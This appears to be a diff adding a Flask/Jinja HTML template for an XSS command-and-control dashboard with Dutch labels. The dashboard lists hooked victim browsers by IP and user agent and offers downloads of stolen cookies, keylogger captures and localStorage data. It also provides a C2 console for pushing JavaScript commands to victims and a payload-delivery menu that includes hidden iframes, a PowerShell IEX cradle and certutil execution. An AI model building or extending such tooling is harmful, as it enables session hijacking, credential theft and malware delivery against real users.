@@ -1,0 +1,226 @@
+{% extends "bootstrap/base.html" %}
+{% block title %}Incompetent Bastard - XSS Telemetry{% endblock %}
+
+{% block styles %}
+<link rel="stylesheet" href="{{ url_for('static', filename='css/dashboard-modern.css') }}" />
+<link rel="stylesheet" href="{{ url_for('static', filename='css/xss-c2.css') }}" />
+{% endblock %}
+
+{% block content %}
+<div class="page-title">
+  <div>
+    <h1>XSS Telemetry</h1>
+    <div class="breadcrumbs"><a href="/">Home</a> / <a href="/">Dashboard</a> / XSS</div>
+  </div>
+</div>
+
+<div class="grid cols-4">
+  <section class="card">
+    <div class="card-body">
+      <div class="kpi">
+        <div>
+          <div class="val accent-orange">{{ aantalhooked }}</div>
+          <div class="sub">Active Clients (5m)</div>
+        </div>
+      </div>
+    </div>
+  </section>
+  <section class="card">
+    <div class="card-body">
+      <div class="kpi">
+        <div>
+          <div class="val">{{ cookies|length }}</div>
+          <div class="sub">Cookies</div>
+        </div>
+      </div>
+    </div>
+  </section>
+  <section class="card">
+    <div class="card-body">
+      <div class="kpi">
+        <div>
+          <div class="val">{{ keylogger|length }}</div>
+          <div class="sub">Keylogger</div>
+        </div>
+      </div>
+    </div>
+  </section>
+  <section class="card">
+    <div class="card-body">
+      <div class="kpi">
+        <div>
+          <div class="val">{{ localstorage|length }}</div>
+          <div class="sub">LocalStorage</div>
+        </div>
+      </div>
+    </div>
+  </section>
+</div>
+
+<div class="grid cols-2 mt-14">
+  <section class="card">
+    <div class="card-head">
+      <h2>Hooked Clients <small>(laatste 5 min)</small></h2>
+    </div>
+    <div class="card-body">
+      {% if hooked %}
+      <table class="table compact">
+        <thead>
+          <tr><th>IP</th><th>User-Agent</th><th>Last seen</th></tr>
+        </thead>
+        <tbody>
+          {% for h in hooked|reverse %}
+          <tr>
+            <td>{{ h.ip }}</td>
+            <td class="max-w-300 truncate">{{ h.agent }}</td>
+            <td>{{ h.datum.strftime('%H:%M:%S') if h.datum else '-' }}</td>
+          </tr>
+          {% endfor %}
+        </tbody>
+      </table>
+      {% else %}
+      <p class="help">Geen actieve hooked clients.</p>
+      {% endif %}
+    </div>
+  </section>
+
+  <section class="card">
+    <div class="card-head">
+      <h2>Cookies</h2>
+    </div>
+    <div class="card-body">
+      {% if cookies %}
+      <table class="table compact">
+        <thead>
+          <tr><th>IP</th><th>Datum</th><th></th></tr>
+        </thead>
+        <tbody>
+          {% for item in cookies|reverse %}
+          <tr>
+            <td>{{ item.ip }}</td>
+            <td>{{ item.datum }}</td>
+            <td><a href="/dashboard/xxs/download_cookies/{{ item.id }}">download</a></td>
+          </tr>
+          {% endfor %}
+        </tbody>
+      </table>
+      {% else %}
+      <p class="help">Geen cookies ontvangen.</p>
+      {% endif %}
+    </div>
+  </section>
+</div>
+
+<div class="grid cols-2 mt-14">
+  <section class="card">
+    <div class="card-head">
+      <h2>Keylogger</h2>
+    </div>
+    <div class="card-body">
+      {% if keylogger %}
+      <table class="table compact">
+        <thead>
+          <tr><th>IP</th><th>Datum</th><th></th></tr>
+        </thead>
+        <tbody>
+          {% for item in keylogger|reverse %}
+          <tr>
+            <td>{{ item.ip }}</td>
+            <td>{{ item.datum }}</td>
+            <td><a href="/dashboard/xxs/download_toetsen/{{ item.id }}">download</a></td>
+          </tr>
+          {% endfor %}
+        </tbody>
+      </table>
+      {% else %}
+      <p class="help">Geen keylogger data.</p>
+      {% endif %}
+    </div>
+  </section>
+
+  <section class="card">
+    <div class="card-head">
+      <h2>LocalStorage</h2>
+    </div>
+    <div class="card-body">
+      {% if localstorage %}
+      <table class="table compact">
+        <thead>
+          <tr><th>IP</th><th>Datum</th><th></th></tr>
+        </thead>
+        <tbody>
+          {% for item in localstorage|reverse %}
+          <tr>
+            <td>{{ item.ip }}</td>
+            <td>{{ item.datum }}</td>
+            <td><a href="/dashboard/xxs/download_localstorage/{{ item.id }}">download</a></td>
+          </tr>
+          {% endfor %}
+        </tbody>
+      </table>
+      {% else %}
+      <p class="help">Geen localstorage data.</p>
+      {% endif %}
+    </div>
+  </section>
+</div>
+
+<div class="c2-panel">
+  <section class="card">
+    <div class="card-head">
+      <h2>C2 Command Console</h2>
+    </div>
+    <div class="card-body">
+      <div class="c2-toolbar">
+        <select id="c2-target">
+          <option value="*">* (alle clients)</option>
+        </select>
+        <button type="button" class="btn-send" id="c2-send">Verstuur</button>
+      </div>
+      <textarea id="c2-cmd" class="c2-textarea" placeholder="document.cookie" rows="3"></textarea>
+      <div class="c2-quick-commands" id="c2-quick">
+        <span class="fs-12 text-muted mr-4">Quick:</span>
+      </div>
+
+      <div class="c2-payload-section">
+        <div class="c2-payload-head">
+          <span class="fs-12 text-muted mr-4">Payload delivery:</span>
+          <select id="c2-payload-select">
+            <option value="">-- kies payload --</option>
+          </select>
+          <select id="c2-delivery-method">
+            <option value="iframe">Hidden iframe</option>
+            <option value="anchor">Anchor download</option>
+            <option value="window">Window.open</option>
+            <option value="ps_cradle">PS Cradle (IEX)</option>
+            <option value="certutil">certutil + exec</option>
+            <option value="xhr_blob">XHR Blob download</option>
+          </select>
+          <button type="button" class="c2-payload-btn" id="c2-payload-inject">Injecteren</button>
+        </div>
+      </div>
+
+      <div class="c2-queue">
+        <table class="table compact">
+          <thead>
+            <tr>
+              <th>ID</th>
+              <th>Target</th>
+              <th>Command</th>
+              <th>Status</th>
+              <th>Result</th>
+              <th></th>
+            </tr>
+          </thead>
+          <tbody id="c2-queue-body"></tbody>
+        </table>
+        <button type="button" class="c2-clear-btn" id="c2-clear">Wis voltooide</button>
+      </div>
+    </div>
+  </section>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script nonce="{{ csp_nonce }}" src="{{ url_for('static', filename='js/xss-c2.js') }}"></script>
+{% endblock %}
